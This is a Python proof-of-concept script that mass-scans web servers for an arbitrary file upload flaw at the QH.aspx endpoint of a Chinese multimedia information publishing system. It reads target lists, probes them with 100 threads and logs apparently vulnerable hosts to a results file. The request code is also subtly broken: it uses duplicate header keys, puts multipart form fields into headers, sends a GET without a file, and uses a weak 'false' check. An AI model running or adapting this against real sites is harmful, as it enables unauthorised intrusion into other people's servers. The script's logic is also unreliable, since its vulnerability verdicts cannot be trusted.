import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                                                           ______
    ______________________________________________ ___  /
    ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
    __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
    _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
    /_/                                                  
                                               author:NaA100
                                               date:2024-09-13
                                               version:1.0                    
    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='某丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

def poc(target):
    payload = "/QH.aspx"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", 
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr", 
        "Content-Disposition": "form-data; name=\"fileToUpload\"; filename=\"qwe.aspx\"", 
        "Content-Type": "application/octet-stream", 
        "Content-Disposition": "form-data; name=\"action\"", 
        "Content-Disposition": "form-data; name=\"responderId\"", 
        "Content-Disposition": "form-data; name=\"remotePath\""
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if re.status_code == 200 and 'false' in re.text:
            print( f"[+] {target} 存在任意文件上传漏洞！")
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'该{target}不存在任意文件上传漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()